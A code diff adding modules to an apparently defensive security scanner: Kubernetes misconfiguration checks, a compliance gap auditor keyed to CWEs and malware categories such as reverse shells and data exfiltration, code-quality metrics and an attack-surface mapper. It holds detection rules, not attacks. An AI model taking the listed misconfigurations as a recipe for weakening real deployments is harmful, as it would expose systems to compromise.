+    {"id": "K8S-001", "title": "Container running as root (runAsNonRoot: false)", "severity": "High", "category": "Privilege",
+     "pattern": r"runAsNonRoot:\s*false",
+     "detail": "Explicitly allowing root execution in a pod spec.", "rec": "Set runAsNonRoot: true and runAsUser: <non-zero-uid>."},
+    {"id": "K8S-002", "title": "Privileged pod spec", "severity": "Critical", "category": "Privilege",
+     "pattern": r"privileged:\s*true",
+     "detail": "Privileged pod has full host access.", "rec": "Remove privileged: true. Use specific capabilities."},
+    {"id": "K8S-003", "title": "Host path volume mount", "severity": "High", "category": "Storage",
+     "pattern": r"hostPath:",
+     "detail": "hostPath mounts expose host filesystem to the container.", "rec": "Use PersistentVolumeClaims instead of hostPath."},
+    {"id": "K8S-004", "title": "AllowPrivilegeEscalation not disabled", "severity": "Medium", "category": "Privilege",
+     "pattern": None, "check_fn": lambda c: "allowPrivilegeEscalation: false" not in c,
+     "detail": "Without this, a process may gain more privileges than its parent.", "rec": "Add: allowPrivilegeEscalation: false to securityContext."},
+    {"id": "K8S-005", "title": "Read-only root filesystem not enforced", "severity": "Medium", "category": "Integrity",
+     "pattern": None, "check_fn": lambda c: "readOnlyRootFilesystem: true" not in c,
+     "detail": "A writable root filesystem allows attackers to install tools after initial compromise.",
+     "rec": "Add: readOnlyRootFilesystem: true to securityContext."},
+    {"id": "K8S-006", "title": "No resource requests/limits", "severity": "Medium", "category": "Resilience",
+     "pattern": None, "check_fn": lambda c: "resources:" not in c,
+     "detail": "Missing resource limits allow noisy-neighbour problems and DoS via resource exhaustion.",
+     "rec": "Define requests and limits for both memory and cpu for every container."},
+    {"id": "K8S-007", "title": "Secret mounted as environment variable", "severity": "Medium", "category": "Secrets",
+     "pattern": r"secretKeyRef:",
+     "detail": "Secrets in env vars are visible in pod specs, crash dumps, and logs.",
+     "rec": "Mount secrets as files in a tmpfs volume. Avoid env var exposure."},
+    {"id": "K8S-008", "title": "Image pull policy: Always not set", "severity": "Low", "category": "Supply Chain",
+     "pattern": None, "check_fn": lambda c: "imagePullPolicy: Always" not in c,
+     "detail": "Without Always, a stale cached image may be used, missing security patches.",
+     "rec": "Set imagePullPolicy: Always for mutable tags."},
+    {"id": "K8S-009", "title": "ServiceAccount token auto-mounted", "severity": "Medium", "category": "Privilege",
+     "pattern": None, "check_fn": lambda c: "automountServiceAccountToken: false" not in c,
+     "detail": "Auto-mounted SA tokens allow any process in the pod to call the Kubernetes API.",
+     "rec": "Add: automountServiceAccountToken: false unless the pod explicitly needs API access."},
+    {"id": "K8S-010", "title": "hostNetwork: true", "severity": "High", "category": "Network",
+     "pattern": r"hostNetwork:\s*true",
+     "detail": "Pod shares host network namespace, bypassing network policies.",
+     "rec": "Remove hostNetwork: true. Use Services and NetworkPolicies instead."},
+]
+
+
+class ContainerSecurityAnalyzer:
+    """
+    Analyzes Dockerfiles, docker-compose.yml/yaml, and Kubernetes manifests
+    (YAML) for 40+ security issues covering privilege escalation, secrets,
+    network exposure, supply-chain risks, and resilience.
+    """
+
+    def _run_checks(self, file_name: str, content: str,
+                    checks: List[Dict[str, Any]], prefix: str) -> List[ContainerFinding]:
+        findings: List[ContainerFinding] = []
+        lines = content.splitlines()
+        for check in checks:
+            pattern = check.get("pattern")
+            check_fn = check.get("check_fn")
+            if pattern:
+                try:
+                    for match in re.finditer(pattern, content, re.MULTILINE | re.DOTALL):
+                        line_no = content[: match.start()].count("\n") + 1
+                        snippet = lines[line_no - 1].strip()[:120] if 0 < line_no <= len(lines) else ""
+                        findings.append(ContainerFinding(
+                            finding_id=f"{file_name}:{line_no}:{check['id']}",
+                            file_name=file_name, line_number=line_no,
+                            check_id=check["id"], title=check["title"],
+                            severity=check["severity"], category=check["category"],
+                            detail=check["detail"] + f" (found: '{snippet}')",
+                            recommendation=check["rec"],
+                        ))
+                        break  # one finding per check per file
+                except re.error:
+                    pass
+            elif check_fn:
+                try:
+                    if check_fn(content):
+                        findings.append(ContainerFinding(
+                            finding_id=f"{file_name}:0:{check['id']}",
+                            file_name=file_name, line_number=0,
+                            check_id=check["id"], title=check["title"],
+                            severity=check["severity"], category=check["category"],
+                            detail=check["detail"], recommendation=check["rec"],
+                        ))
+                except Exception:
+                    pass
+        return findings
+
+    def analyze(self, file_name: str, content: str) -> List[ContainerFinding]:
+        fname_lower = file_name.lower().replace("\\", "/").split("/")[-1]
+        if fname_lower == "dockerfile" or fname_lower.startswith("dockerfile."):
+            return self._run_checks(file_name, content, DOCKERFILE_CHECKS, "DCK")
+        if fname_lower in ("docker-compose.yml", "docker-compose.yaml",
+                           "compose.yml", "compose.yaml"):
+            return self._run_checks(file_name, content, COMPOSE_CHECKS, "CMP")
+        if fname_lower.endswith((".yml", ".yaml")):
+            k8s_hints = any(k in content for k in ["apiVersion:", "kind: Pod", "kind: Deployment",
+                                                     "kind: DaemonSet", "kind: StatefulSet"])
+            if k8s_hints:
+                return self._run_checks(file_name, content, K8S_CHECKS, "K8S")
+        return []
+
+    def analyze_files(self, files: Dict[str, str]) -> List[ContainerFinding]:
+        findings: List[ContainerFinding] = []
+        for name, content in files.items():
+            findings.extend(self.analyze(name, content))
+        return findings
+
+
+# ==============================================================================
+# ==============================================================================
+#  MODULE: COMPLIANCE AUDITOR
+#  Maps detected findings onto PCI-DSS v4.0, HIPAA, SOC 2, GDPR, NIST CSF.
+#  Generates a gap analysis report for each framework.
+# ==============================================================================
+# ==============================================================================
+
+class ComplianceFramework(str, Enum):
+    PCI_DSS   = "PCI-DSS v4.0"
+    HIPAA     = "HIPAA Security Rule"
+    SOC2      = "SOC 2 Type II"
+    GDPR      = "GDPR (Technical)"
+    NIST_CSF  = "NIST CSF 2.0"
+    ISO_27001 = "ISO 27001:2022"
+
+
+@dataclass
+class ComplianceControl:
+    control_id: str
+    framework: ComplianceFramework
+    title: str
+    description: str
+    cwe_triggers: Set[str]          # CWEs whose presence = gap
+    category_triggers: Set[str]     # Malware categories that trigger a gap
+    severity_threshold: int         # Min number of Critical/High findings to trigger gap
+    remediation_guidance: str
+
+
+@dataclass
+class ComplianceGap:
+    control: ComplianceControl
+    status: str             # "PASS" | "GAP" | "PARTIAL"
+    evidence: List[str]     # Finding IDs / descriptions that drove this
+    risk_rating: str
+
+
+@dataclass
+class ComplianceReport:
+    framework: ComplianceFramework
+    generated_at: str
+    total_controls: int
+    gaps: int
+    partial: int
+    passed: int
+    pass_rate: float
+    gap_details: List[ComplianceGap]
+
+    def to_dict(self) -> Dict[str, Any]:
+        return {
+            "framework": self.framework.value,
+            "generated_at": self.generated_at,
+            "total_controls": self.total_controls,
+            "gaps": self.gaps,
+            "partial": self.partial,
+            "passed": self.passed,
+            "pass_rate": round(self.pass_rate, 1),
+            "gap_details": [
+                {"control_id": g.control.control_id, "title": g.control.title,
+                 "status": g.status, "risk": g.risk_rating,
+                 "evidence_count": len(g.evidence)}
+                for g in self.gap_details
+            ],
+        }
+
+
+COMPLIANCE_CONTROLS: List[ComplianceControl] = [
+    # ── PCI-DSS v4.0 ──────────────────────────────────────────────────────────
+    ComplianceControl("PCI-6.2.4", ComplianceFramework.PCI_DSS,
+        "Prevent common software attack techniques",
+        "Software is developed to prevent or mitigate injection attacks, broken access control, "
+        "cryptographic failures, and insecure design.",
+        cwe_triggers={"CWE-89","CWE-78","CWE-95","CWE-79","CWE-22","CWE-502","CWE-918"},
+        category_triggers=set(), severity_threshold=1,
+        remediation_guidance="Remediate all Critical/High findings in Code Scanner and Semantic Scanner tabs."),
+    ComplianceControl("PCI-3.5.1", ComplianceFramework.PCI_DSS,
+        "Primary account numbers (PAN) must be secured with strong cryptography",
+        "Where cryptography is used for PAN storage or transmission, only strong cryptography is used.",
+        cwe_triggers={"CWE-326","CWE-327","CWE-330"},
+        category_triggers=set(), severity_threshold=1,
+        remediation_guidance="Replace all weak hash algorithms (MD5, SHA1) with SHA-256+. Use AES-256-GCM for encryption."),
+    ComplianceControl("PCI-8.3.6", ComplianceFramework.PCI_DSS,
+        "Passwords must meet minimum complexity requirements",
+        "If passwords/passphrases are used as authentication factors, they meet minimum length/complexity.",
+        cwe_triggers={"CWE-521","CWE-798"},
+        category_triggers=set(), severity_threshold=1,
+        remediation_guidance="Enforce minimum 12-character passwords. Remove all hardcoded credentials immediately."),
+    ComplianceControl("PCI-12.3.2", ComplianceFramework.PCI_DSS,
+        "Targeted risk analysis for custom and bespoke software",
+        "A targeted risk analysis is performed for all bespoke and custom software.",
+        cwe_triggers=set(), category_triggers=set(), severity_threshold=3,
+        remediation_guidance="Run automated scans regularly and conduct manual penetration testing annually."),
+    ComplianceControl("PCI-6.4.1", ComplianceFramework.PCI_DSS,
+        "Web-facing applications are protected against known attacks",
+        "All public-facing web applications are protected via technical or automated solutions.",
+        cwe_triggers={"CWE-89","CWE-79","CWE-352","CWE-601"},
+        category_triggers=set(), severity_threshold=1,
+        remediation_guidance="Deploy a WAF. Remediate all injection and XSS findings."),
+
+    # ── HIPAA Security Rule ────────────────────────────────────────────────────
+    ComplianceControl("HIPAA-164.312(a)(2)(iv)", ComplianceFramework.HIPAA,
+        "Encryption and decryption of ePHI",
+        "Implement a mechanism to encrypt and decrypt electronic protected health information.",
+        cwe_triggers={"CWE-326","CWE-327","CWE-319"},
+        category_triggers=set(), severity_threshold=1,
+        remediation_guidance="Replace weak cryptography with AES-256. Enforce TLS 1.2+ on all ePHI channels."),
+    ComplianceControl("HIPAA-164.312(c)(1)", ComplianceFramework.HIPAA,
+        "Integrity controls for ePHI",
+        "Implement policies and procedures to protect ePHI from improper alteration or destruction.",
+        cwe_triggers={"CWE-502","CWE-829"},
+        category_triggers={"Data Exfiltration"}, severity_threshold=1,
+        remediation_guidance="Remove all insecure deserialization. Implement integrity checking (HMAC) on stored ePHI."),
+    ComplianceControl("HIPAA-164.312(d)", ComplianceFramework.HIPAA,
+        "Person or entity authentication",
+        "Implement procedures to verify that a person or entity seeking access to ePHI is the one claimed.",
+        cwe_triggers={"CWE-798","CWE-521","CWE-307"},
+        category_triggers={"Backdoor"}, severity_threshold=1,
+        remediation_guidance="Remove hardcoded credentials. Implement MFA. Add rate limiting to authentication endpoints."),
+    ComplianceControl("HIPAA-164.308(a)(5)(ii)(B)", ComplianceFramework.HIPAA,
+        "Protection from malicious software",
+        "Procedures for guarding against, detecting, and reporting malicious software.",
+        cwe_triggers=set(), category_triggers={"Reverse Shell","Backdoor","Cryptominer","Data Exfiltration"},
+        severity_threshold=0,
+        remediation_guidance="Remove all detected malware patterns immediately. Implement code signing and integrity checks."),
+
+    # ── SOC 2 Type II ─────────────────────────────────────────────────────────
+    ComplianceControl("CC7.1", ComplianceFramework.SOC2,
+        "Common Criteria: Detection and monitoring of security events",
+        "The entity uses detection and monitoring procedures to identify changes to configurations "
+        "that result in the introduction of new vulnerabilities.",
+        cwe_triggers=set(), category_triggers=set(), severity_threshold=5,
+        remediation_guidance="Implement continuous scanning. Integrate Sentinel AI into your CI/CD pipeline."),
+    ComplianceControl("CC6.1", ComplianceFramework.SOC2,
+        "Logical and physical access controls",
+        "The entity implements logical access security measures to protect against threats from sources outside its system boundaries.",
+        cwe_triggers={"CWE-284","CWE-285","CWE-732","CWE-639"},
+        category_triggers=set(), severity_threshold=1,
+        remediation_guidance="Remediate all broken access control findings. Implement least-privilege across all systems."),
+    ComplianceControl("CC8.1", ComplianceFramework.SOC2,
+        "Change management — authorised changes only",
+        "The entity authorizes, designs, develops or acquires, configures, documents, tests, approves, and implements changes.",
+        cwe_triggers=set(), category_triggers={"Backdoor","Reverse Shell"},
+        severity_threshold=0,
+        remediation_guidance="Implement mandatory code review and approval gates. Any detected backdoor indicates a change control failure."),
+    ComplianceControl("CC9.2", ComplianceFramework.SOC2,
+        "Risk assessment of vendors and business partners",
+        "The entity assesses and manages risks associated with vendors and business partners.",
+        cwe_triggers=set(), category_triggers=set(), severity_threshold=0,
+        remediation_guidance="Use the Dependency CVE and SBOM tabs to maintain a current vulnerability inventory of all third-party components."),
+
+    # ── GDPR (Technical measures) ──────────────────────────────────────────────
+    ComplianceControl("GDPR-Art25", ComplianceFramework.GDPR,
+        "Data protection by design and by default",
+        "Implement appropriate technical measures to ensure data protection principles are integrated into processing.",
+        cwe_triggers={"CWE-200","CWE-312","CWE-359"},
+        category_triggers={"Data Exfiltration"}, severity_threshold=1,
+        remediation_guidance="Remove all data-leaking patterns. Implement data minimisation at the code level."),
+    ComplianceControl("GDPR-Art32", ComplianceFramework.GDPR,
+        "Security of processing — appropriate technical measures",
+        "Implement pseudonymisation and encryption of personal data; ensure ongoing confidentiality, integrity, and availability.",
+        cwe_triggers={"CWE-326","CWE-327","CWE-319","CWE-89"},
+        category_triggers=set(), severity_threshold=1,
+        remediation_guidance="Encrypt all personal data at rest and in transit. Remediate injection vulnerabilities."),
+    ComplianceControl("GDPR-Art33", ComplianceFramework.GDPR,
+        "Notification of personal data breach",
+        "In the case of a personal data breach, notify the supervisory authority within 72 hours.",
+        cwe_triggers=set(), category_triggers={"Data Exfiltration","Reverse Shell","Backdoor"},
+        severity_threshold=0,
+        remediation_guidance="Detected malware/exfiltration patterns may constitute a breach. Activate your incident response plan immediately."),
+
+    # ── NIST CSF 2.0 ──────────────────────────────────────────────────────────
+    ComplianceControl("NIST-ID.RA", ComplianceFramework.NIST_CSF,
+        "Risk Assessment — cybersecurity risk identified and prioritised",
+        "Vulnerabilities in assets are identified and documented.",
+        cwe_triggers=set(), category_triggers=set(), severity_threshold=1,
+        remediation_guidance="Run all scanner tabs and generate a full report. Use the Executive Summary as risk documentation."),
+    ComplianceControl("NIST-PR.DS", ComplianceFramework.NIST_CSF,
+        "Data Security — data managed consistently with risk strategy",
+        "Data-at-rest and data-in-transit are protected.",
+        cwe_triggers={"CWE-311","CWE-312","CWE-326","CWE-319"},
+        category_triggers=set(), severity_threshold=1,
+        remediation_guidance="Enforce encryption for all sensitive data. Review findings in the Code Scanner tab."),
+    ComplianceControl("NIST-PR.AC", ComplianceFramework.NIST_CSF,
+        "Access Control — access to assets managed",
+        "Identities and credentials are managed for authorised devices, users, and processes.",
+        cwe_triggers={"CWE-798","CWE-521","CWE-307","CWE-284"},
+        category_triggers={"Backdoor"}, severity_threshold=1,
+        remediation_guidance="Remove hardcoded credentials. Rotate any exposed secrets. Implement RBAC."),
+    ComplianceControl("NIST-DE.CM", ComplianceFramework.NIST_CSF,
+        "Detection — assets monitored to identify anomalies",
+        "The network is monitored to detect potential cybersecurity events.",
+        cwe_triggers=set(), category_triggers=set(), severity_threshold=0,
+        remediation_guidance="Use the Network Telemetry tab for continuous monitoring. Integrate with SIEM for persistent detection."),
+    ComplianceControl("NIST-RS.MI", ComplianceFramework.NIST_CSF,
+        "Response — incidents contained and mitigated",
+        "Incidents are contained and mitigated.",
+        cwe_triggers=set(), category_triggers={"Reverse Shell","Backdoor","Cryptominer"},
+        severity_threshold=0,
+        remediation_guidance="Activate the Containment tab immediately for detected malware patterns."),
+
+    # ── ISO 27001:2022 ─────────────────────────────────────────────────────────
+    ComplianceControl("ISO-8.25", ComplianceFramework.ISO_27001,
+        "Secure development life cycle",
+        "Rules for the secure development of software and systems shall be established and applied.",
+        cwe_triggers={"CWE-89","CWE-79","CWE-78","CWE-502","CWE-95"},
+        category_triggers=set(), severity_threshold=1,
+        remediation_guidance="Remediate all injection and execution findings. Integrate SAST into CI/CD."),
+    ComplianceControl("ISO-8.24", ComplianceFramework.ISO_27001,
+        "Use of cryptography",
+        "Rules for effective use of cryptography shall be defined and implemented.",
+        cwe_triggers={"CWE-326","CWE-327","CWE-330","CWE-295"},
+        category_triggers=set(), severity_threshold=1,
+        remediation_guidance="Replace all weak cryptographic algorithms. Verify TLS configuration with the SSL tab."),
+    ComplianceControl("ISO-8.8", ComplianceFramework.ISO_27001,
+        "Management of technical vulnerabilities",
+        "Technical vulnerabilities shall be identified and patched.",
+        cwe_triggers=set(), category_triggers=set(), severity_threshold=3,
+        remediation_guidance="Use the Dependency CVE tab and SBOM Generator to track and remediate known CVEs."),
+]
+
+
+class ComplianceAuditor:
+    """
+    Maps code findings, malware findings, and network events onto each
+    compliance framework's controls, producing a gap analysis with evidence.
+    """
+
+    def __init__(self, controls: Optional[List[ComplianceControl]] = None):
+        self.controls = controls or COMPLIANCE_CONTROLS
+
+    def _count_matching(self, findings: List[Any], cwe_triggers: Set[str],
+                         category_triggers: Set[str]) -> Tuple[int, List[str]]:
+        count = 0
+        evidence: List[str] = []
+        for f in findings:
+            cwe = getattr(getattr(f, "standards", None), "cwe", None) or getattr(f, "cwe", "") or ""
+            cat = getattr(f, "category", "") or getattr(f, "vuln_class", "") or ""
+            severity = getattr(f, "severity", "")
+            fid = getattr(f, "finding_id", getattr(f, "rule_id", "?"))
+            if cwe in cwe_triggers or any(t in cat for t in category_triggers):
+                if severity in ("Critical", "High"):
+                    count += 1
+                    evidence.append(f"{fid} [{severity}]")
+        return count, evidence
+
+    def audit(self, code_findings: List[Any], malware_findings: List[MalwareFinding],
+               semantic_findings: List[Any], dep_findings: List[Any],
+               framework: Optional[ComplianceFramework] = None) -> List[ComplianceReport]:
+        all_findings = list(code_findings) + list(semantic_findings) + list(dep_findings)
+        all_findings_with_malware = all_findings + list(malware_findings)  # type: ignore
+
+        frameworks = [framework] if framework else list(ComplianceFramework)
+        reports: List[ComplianceReport] = []
+
+        for fw in frameworks:
+            fw_controls = [c for c in self.controls if c.framework == fw]
+            gaps: List[ComplianceGap] = []
+
+            for ctrl in fw_controls:
+                count, evidence = self._count_matching(
+                    all_findings_with_malware, ctrl.cwe_triggers, ctrl.category_triggers
+                )
+                mal_count = sum(1 for m in malware_findings if m.category in ctrl.category_triggers)
+
+                if count >= max(ctrl.severity_threshold, 1) or mal_count > 0:
+                    status = "GAP"
+                    risk = "Critical" if count >= 3 or mal_count > 0 else "High"
+                elif count > 0 or ctrl.severity_threshold == 0:
+                    status = "PARTIAL"
+                    risk = "Medium"
+                else:
+                    status = "PASS"
+                    risk = "Low"
+
+                gaps.append(ComplianceGap(control=ctrl, status=status, evidence=evidence, risk_rating=risk))
+
+            total = len(gaps)
+            gap_count = sum(1 for g in gaps if g.status == "GAP")
+            partial_count = sum(1 for g in gaps if g.status == "PARTIAL")
+            pass_count = sum(1 for g in gaps if g.status == "PASS")
+            pass_rate = (pass_count / total * 100) if total > 0 else 100.0
+
+            reports.append(ComplianceReport(
+                framework=fw,
+                generated_at=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+                total_controls=total, gaps=gap_count, partial=partial_count,
+                passed=pass_count, pass_rate=pass_rate, gap_details=gaps,
+            ))
+
+        return reports
+
+
+# ==============================================================================
+# ==============================================================================
+#  MODULE: CODE QUALITY METRICS ENGINE
+#  Cyclomatic complexity, maintainability index, function length, comment ratio,
+#  and duplication fingerprinting — for any Python source file.
+# ==============================================================================
+# ==============================================================================
+
+@dataclass
+class FunctionMetrics:
+    name: str
+    file_name: str
+    line_start: int
+    line_end: int
+    line_count: int
+    cyclomatic_complexity: int
+    parameter_count: int
+    return_count: int
+    nested_depth: int
+    risk_level: str   # "Low" | "Medium" | "High" | "Critical"
+
+    def to_dict(self) -> Dict[str, Any]:
+        return {
+            "function": self.name, "file": self.file_name,
+            "lines": f"{self.line_start}-{self.line_end}", "loc": self.line_count,
+            "complexity": self.cyclomatic_complexity, "params": self.parameter_count,
+            "returns": self.return_count, "max_nesting": self.nested_depth,
+            "risk": self.risk_level,
+        }
+
+
+@dataclass
+class FileQualityReport:
+    file_name: str
+    total_lines: int
+    code_lines: int
+    comment_lines: int
+    blank_lines: int
+    comment_ratio: float
+    maintainability_index: float   # 0-100, higher is better
+    function_count: int
+    class_count: int
+    avg_complexity: float
+    max_complexity: int
+    functions: List[FunctionMetrics]
+    duplicate_block_count: int
+    overall_grade: str
+
+    def to_dict(self) -> Dict[str, Any]:
+        return {
+            "file": self.file_name, "total_lines": self.total_lines,
+            "code_lines": self.code_lines, "comment_ratio": round(self.comment_ratio, 2),
+            "maintainability_index": round(self.maintainability_index, 1),
+            "functions": self.function_count, "classes": self.class_count,
+            "avg_complexity": round(self.avg_complexity, 1),
+            "max_complexity": self.max_complexity,
+            "duplicate_blocks": self.duplicate_block_count,
+            "grade": self.overall_grade,
+        }
+
+
+class CodeQualityEngine:
+    """
+    Computes code quality metrics for Python source files using the ast module.
+    Implements Halstead-inspired maintainability index and McCabe cyclomatic
+    complexity for individual functions.
+    """
+
+    @staticmethod
+    def _cyclomatic(func_node: ast.FunctionDef) -> int:
+        """McCabe cyclomatic complexity = edges - nodes + 2 (simplified to branch count + 1)."""
+        complexity = 1
+        for node in ast.walk(func_node):
+            if isinstance(node, (ast.If, ast.While, ast.For, ast.ExceptHandler,
+                                  ast.With, ast.Assert, ast.comprehension)):
+                complexity += 1
+            elif isinstance(node, ast.BoolOp):
+                complexity += len(node.values) - 1
+        return complexity
+
+    @staticmethod
+    def _max_nesting(func_node: ast.FunctionDef) -> int:
+        max_depth = [0]
+        def _walk(node: ast.AST, depth: int) -> None:
+            if isinstance(node, (ast.If, ast.For, ast.While, ast.Try, ast.With)):
+                max_depth[0] = max(max_depth[0], depth)
+                for child in ast.iter_child_nodes(node):
+                    _walk(child, depth + 1)
+            else:
+                for child in ast.iter_child_nodes(node):
+                    _walk(child, depth)
+        _walk(func_node, 1)
+        return max_depth[0]
+
+    @staticmethod
+    def _return_count(func_node: ast.FunctionDef) -> int:
+        return sum(1 for n in ast.walk(func_node) if isinstance(n, ast.Return))
+
+    @staticmethod
+    def _complexity_risk(cc: int) -> str:
+        if cc <= 5:   return "Low"
+        if cc <= 10:  return "Medium"
+        if cc <= 20:  return "High"
+        return "Critical"
+
+    @staticmethod
+    def _maintainability_index(loc: int, avg_cc: float, comment_ratio: float) -> float:
+        """
+        Simplified Maintainability Index (0-100 scale, Microsoft variant).
+        MI = 171 - 5.2 * ln(Halstead Volume) - 0.23 * CC - 16.2 * ln(LOC) + 50 * sin(sqrt(2.4 * CM))
+        Simplified here using only LOC, avg complexity, and comment ratio:
+        """
+        if loc <= 0:
+            return 100.0
+        import math as _math
+        mi = max(0.0, 171
+                 - 5.2 * _math.log(max(loc, 1))
+                 - 0.23 * avg_cc
+                 - 16.2 * _math.log(max(loc, 1))
+                 + 50 * _math.sin(_math.sqrt(2.4 * min(comment_ratio, 1.0))))
+        return round(min(mi / 1.71, 100.0), 1)
+
+    @staticmethod
+    def _duplicate_blocks(lines: List[str], min_block: int = 6) -> int:
+        """Detect duplicate line sequences using sliding window fingerprinting."""
+        if len(lines) < min_block:
+            return 0
+        clean = [l.strip() for l in lines if l.strip() and not l.strip().startswith("#")]
+        seen: Set[int] = set()
+        dupes = 0
+        for i in range(len(clean) - min_block + 1):
+            block = tuple(clean[i: i + min_block])
+            h = hash(block)
+            if h in seen:
+                dupes += 1
+            else:
+                seen.add(h)
+        return dupes
+
+    def analyze(self, file_name: str, content: str) -> Optional[FileQualityReport]:
+        try:
+            tree = ast.parse(content)
+        except SyntaxError:
+            return None
+
+        lines = content.splitlines()
+        total = len(lines)
+        blank = sum(1 for l in lines if not l.strip())
+        comment = sum(1 for l in lines if l.strip().startswith("#"))
+        code = total - blank - comment
+        comment_ratio = comment / max(total, 1)
+
+        functions: List[FunctionMetrics] = []
+        class_count = sum(1 for n in ast.walk(tree) if isinstance(n, ast.ClassDef))
+
+        for node in ast.walk(tree):
+            if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)):
+                cc = self._cyclomatic(node)  # type: ignore[arg-type]
+                end_line = max(getattr(n, "lineno", node.lineno) for n in ast.walk(node))
+                functions.append(FunctionMetrics(
+                    name=node.name, file_name=file_name,
+                    line_start=node.lineno, line_end=end_line,
+                    line_count=end_line - node.lineno + 1,
+                    cyclomatic_complexity=cc,
+                    parameter_count=len(node.args.args),
+                    return_count=self._return_count(node),  # type: ignore[arg-type]
+                    nested_depth=self._max_nesting(node),  # type: ignore[arg-type]
+                    risk_level=self._complexity_risk(cc),
+                ))
+
+        avg_cc = sum(f.cyclomatic_complexity for f in functions) / max(len(functions), 1)
+        max_cc = max((f.cyclomatic_complexity for f in functions), default=1)
+        mi = self._maintainability_index(code, avg_cc, comment_ratio)
+        dupes = self._duplicate_blocks(lines)
+
+        if mi >= 80 and max_cc <= 10:
+            grade = "A"
+        elif mi >= 65 and max_cc <= 15:
+            grade = "B"
+        elif mi >= 50 and max_cc <= 20:
+            grade = "C"
+        elif mi >= 30:
+            grade = "D"
+        else:
+            grade = "F"
+
+        return FileQualityReport(
+            file_name=file_name, total_lines=total, code_lines=code,
+            comment_lines=comment, blank_lines=blank, comment_ratio=comment_ratio,
+            maintainability_index=mi, function_count=len(functions),
+            class_count=class_count, avg_complexity=avg_cc, max_complexity=max_cc,
+            functions=sorted(functions, key=lambda f: f.cyclomatic_complexity, reverse=True),
+            duplicate_block_count=dupes, overall_grade=grade,
+        )
+
+
+# ==============================================================================
+# ==============================================================================
+#  MODULE: ATTACK SURFACE MAPPER
+#  Enumerates all entry points in a Python codebase and quantifies risk.
+# ==============================================================================
+# ==============================================================================
+
+@dataclass
+class EntryPoint:
+    kind: str           # "http_route" | "cli_arg" | "env_var" | "file_input" | "network_socket" | "ipc"
+    name: str
+    file_name: str
+    line_number: int
+    handler: str
+    accepts_input: bool
+    exposed_to: str     # "internet" | "local" | "internal" | "unknown"
+    risk_score: int     # 0-10
+
+    def to_dict(self) -> Dict[str, Any]:
+        return {
+            "kind": self.kind, "name": self.name, "file": self.file_name,
+            "line": self.line_number, "handler": self.handler,
+            "accepts_input": self.accepts_input, "exposed_to": self.exposed_to,
+            "risk_score": self.risk_score,
+        }
+
+
+class AttackSurfaceMapper:
+    """
+    Statically enumerates all external entry points in Python source:
+    HTTP routes, CLI argument parsers, environment variable reads,
+    file input handlers, and network socket listeners.
+    Scores each entry point by exposure level and input-acceptance.
+    """
+
+    ROUTE_DECORATORS = {"route", "get", "post", "put", "delete", "patch", "head", "options"}
+    CLI_SOURCES = {"argparse.ArgumentParser", "click.argument", "click.option", "sys.argv"}
+    FILE_SOURCES = {"open", "read", "readlines", "readline"}
+    SOCKET_SOURCES = {"socket.bind", "socket.accept", "socket.listen"}
+
+    def _route_exposure(self, methods: Set[str]) -> Tuple[str, int]:
+        if any(m in methods for m in {"POST", "PUT", "DELETE", "PATCH"}):
+            return "internet", 8
+        return "internet", 6
+
+    def analyze(self, file_name: str, content: str) -> List[EntryPoint]:
+        try:
+            tree = ast.parse(content)
+        except SyntaxError:
+            return []
+
+        lines = content.splitlines()
+        try:
+            ir = ImportResolver()
+            ir.visit(tree)
+            aliases = ir.aliases
+        except Exception:
+            aliases = {}
+
+        entry_points: List[EntryPoint] = []
+
+        for node in ast.walk(tree):
+            if not isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)):
+                continue
+            for deco in node.decorator_list:
+                resolved = dotted_name(deco, aliases) or ""
+                deco_tail = resolved.split(".")[-1].lower() if resolved else ""
+                if deco_tail in self.ROUTE_DECORATORS:
+                    exposure, risk = self._route_exposure(set())
+                    methods: List[str] = []
+                    if isinstance(deco, ast.Call):
+                        for kw in deco.keywords:
+                            if kw.arg == "methods" and isinstance(kw.value, ast.List):
+                                methods = [ast.unparse(e) for e in kw.value.elts]
+                    route_str = ""
+                    if isinstance(deco, ast.Call) and deco.args:
+                        try:
+                            route_str = ast.unparse(deco.args[0])
+                        except Exception:
+                            pass
+                    entry_points.append(EntryPoint(
+                        kind="http_route", name=route_str or f"/{node.name}",
+                        file_name=file_name, line_number=node.lineno,
+                        handler=node.name, accepts_input=True,
+                        exposed_to=exposure, risk_score=risk,
+                    ))
+
+            for child in ast.walk(node):
+                if isinstance(child, ast.Call):
+                    r = dotted_name(child, aliases) or ""
+                    if "os.environ.get" in r or "os.getenv" in r:
+                        entry_points.append(EntryPoint(
+                            kind="env_var", name=r, file_name=file_name,
+                            line_number=getattr(child, "lineno", node.lineno),
+                            handler=node.name, accepts_input=True,
+                            exposed_to="internal", risk_score=4,
+                        ))
+                    elif "sys.argv" in r or "argparse" in r or "click" in r.lower():
+                        entry_points.append(EntryPoint(
+                            kind="cli_arg", name=r, file_name=file_name,
+                            line_number=getattr(child, "lineno", node.lineno),
+                            handler=node.name, accepts_input=True,
+                            exposed_to="local", risk_score=3,
+                        ))
+                    elif r.endswith(".bind") or r.endswith(".listen") or r.endswith(".accept"):
+                        entry_points.append(EntryPoint(
+                            kind="network_socket", name=r, file_name=file_name,
+                            line_number=getattr(child, "lineno", node.lineno),
+                            handler=node.name, accepts_input=True,
+                            exposed_to="internet", risk_score=9,
+                        ))
+
+        return entry_points
+
+    def analyze_files(self, files: Dict[str, str]) -> List[EntryPoint]:
+        all_eps: List[EntryPoint] = []
+        for name, content in files.items():
+            if name.endswith(".py"):
+                all_eps.extend(self.analyze(name, content))
+        return all_eps
+
+    @staticmethod
+    def surface_score(entry_points: List[EntryPoint]) -> int:
+        if not entry_points:
+            return 0
+        return min(int(sum(e.risk_score for e in entry_points) / len(entry_points) * 10), 100)
+
+
+# ==============================================================================
+# ==============================================================================
+#  MODULE: SECURITY POSTURE SCORER
+#  Aggregates findings from ALL engines into a single 0-100 security score
+#  with a letter grade, trend tracking, and per-category breakdown.
+# ==============================================================================
+# ==============================================================================
+
+@dataclass
+class PostureScore:
+    overall: int          # 0-100 (100 = perfect security)
+    grade: str            # A+ / A / B / C / D / F
+    category_scores: Dict[str, int]
+    critical_issues: int
+    high_issues: int
+    trend: str            # "Improving" | "Stable" | "Degrading" | "First scan"
+    generated_at: str
+    recommendations: List[str]
+
+    def to_dict(self) -> Dict[str, Any]:
+        return {
+            "overall_score": self.overall, "grade": self.grade,
+            "categories": self.category_scores, "critical": self.critical_issues,
+            "high": self.high_issues, "trend": self.trend,
